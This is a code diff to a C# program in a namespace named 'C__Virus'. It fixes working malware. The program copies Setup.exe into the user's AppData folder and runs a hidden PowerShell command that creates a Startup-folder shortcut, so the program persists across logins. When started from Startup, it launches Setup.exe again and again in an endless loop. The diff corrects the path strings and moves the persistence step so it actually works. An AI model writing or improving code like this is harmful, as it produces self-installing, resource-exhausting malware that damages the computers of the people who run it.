@@ -18,8 +18,8 @@ namespace C__Virus
                 string homedir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                 string fileName = "Setup.exe";
                 string sourcePath = Directory.GetCurrentDirectory();
-                string ExEPath2 = Path.Combine(homedir, "AppData/local");
-                string targetPath = Path.Combine(homedir, "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");
+                string ExEPath2 = Path.Combine(homedir, "AppData\\Local");
+                string targetPath = Path.Combine(homedir, "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
 
 
                 if (Directory.GetCurrentDirectory() != targetPath)
@@ -43,6 +43,16 @@ namespace C__Virus
                         destFile = System.IO.Path.Combine(ExEPath2, fileName);
                         string sorcFile = System.IO.Path.Combine(sourcePath, fileName);
                         System.IO.File.Copy(sorcFile, destFile, true);
+
+                        System.Diagnostics.Process process = new System.Diagnostics.Process();
+                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                        string Command = $"$WshShell = New-Object -comObject WScript.Shell;$Shortcut = $WshShell.CreateShortcut('"+Path.Combine(targetPath, "Setup.lnk")+"');$Shortcut.TargetPath = '"+Path.Combine(ExEPath2, "Setup.exe")+"';$Shortcut.Save();";
+                        startInfo.FileName = "powershell.exe";
+                        startInfo.Arguments = $"-Command \"{Command}\"";
+                        process.StartInfo = startInfo;
+                        process.Start();
+                        Thread.Sleep(100000);
                     }
                     else
                     {
@@ -52,7 +62,6 @@ namespace C__Virus
                 }
                 else
                 {
-                    Thread.Sleep(10000);
                     while (true)
                     {
                         //Thread.Sleep(5000);
@@ -60,14 +69,6 @@ namespace C__Virus
                         Process.Start(@"./Setup.exe");
                     }
                 }
-                System.Diagnostics.Process process = new System.Diagnostics.Process();
-                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
-                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-                string Command = $"$WshShell = New-Object -comObject WScript.Shell;$Shortcut = $WshShell.CreateShortcut(\"{targetPath}\");$Shortcut.TargetPath = \"{Path.Combine(ExEPath2, "Setup.exe")}\";$Shortcut.Save();";
-                startInfo.FileName = "powershell.exe";
-                startInfo.Arguments = $"-Command \"{Command}\"";
-                process.StartInfo = startInfo;
-                process.Start();
 
                 while (true)
                 {
